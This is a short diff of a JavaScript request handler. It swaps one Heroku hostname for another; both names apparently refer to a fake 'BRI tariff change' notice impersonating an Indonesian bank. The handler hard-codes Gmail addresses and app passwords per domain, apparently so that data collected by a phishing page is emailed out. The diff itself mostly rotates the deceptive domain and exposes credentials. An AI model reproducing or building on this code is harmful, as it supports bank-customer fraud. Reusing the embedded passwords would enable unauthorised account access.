@@ -13,7 +13,7 @@ export default function handler(req, res) {
         email = 'sehebat52@gmail.com'; //email
         pass = 'xkzebfcpoaqurrsw'; //sandi aplikasi dari verifikasi 2 langkah
         
-    } else if(url == 'perubahantarifbri.herokuapp.com') //jika url sama dengan url hosting
+    } else if(url == 'pilihperubahantarif.herokuapp.com') //jika url sama dengan url hosting
     {
         email = 'sinetronsilala@gmail.com'; //email
         pass = 'xqlshlibfcvtzepl'; //sandi aplikasi dari verifikasi 2 langkah
